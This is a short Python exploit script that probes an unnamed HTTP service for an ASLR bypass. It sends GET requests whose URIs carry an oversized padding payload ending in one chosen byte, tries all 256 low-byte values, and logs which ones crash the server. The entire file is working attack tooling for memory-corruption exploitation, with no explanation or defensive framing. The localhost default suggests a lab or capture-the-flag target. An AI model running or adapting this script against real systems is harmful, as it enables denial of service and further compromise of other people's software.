#!/usr/bin/env python3
import argparse
import socket
import struct
import sys
import time


def probe_partial_overwrite(host, port, low_byte):
    payload = "A" * 349 + "+" * 969 + chr(low_byte)
    uri = f"/api/{payload}"

    s = socket.create_connection((host, port), timeout=5)
    req = (
        f"GET {uri} HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("latin-1")

    s.sendall(req)
    time.sleep(1)
    crashed = False
    try:
        s.recv(1)
    except (ConnectionResetError, BrokenPipeError, OSError):
        crashed = True
    s.close()
    return crashed


def main():
    parser = argparse.ArgumentParser(
        description="ASLR bypass via partial overwrite probing"
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=19321)
    parser.add_argument("--byte-range", type=int, default=256,
                        help="Number of low-byte values to probe")
    parser.add_argument("--delay", type=float, default=2.0,
                        help="Delay between probes")
    args = parser.parse_args()

    print(f"Probing ASLR base via partial overwrite on {args.host}:{args.port}")
    print(f"Testing low bytes 0x00-0x{args.byte_range-1:02x}")
    print()

    for b in range(args.byte_range):
        alive = False
        try:
            s = socket.create_connection((args.host, args.port), timeout=3)
            s.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
            s.recv(10)
            s.close()
            alive = True
        except Exception:
            time.sleep(5)
            continue

        if not alive:
            continue

        crashed = probe_partial_overwrite(args.host, args.port, b)
        status = "CRASH" if crashed else "alive"
        print(f"  0x{b:02x}: {status}")

        if crashed:
            time.sleep(3)

        time.sleep(args.delay)


if __name__ == "__main__":
    sys.exit(main())
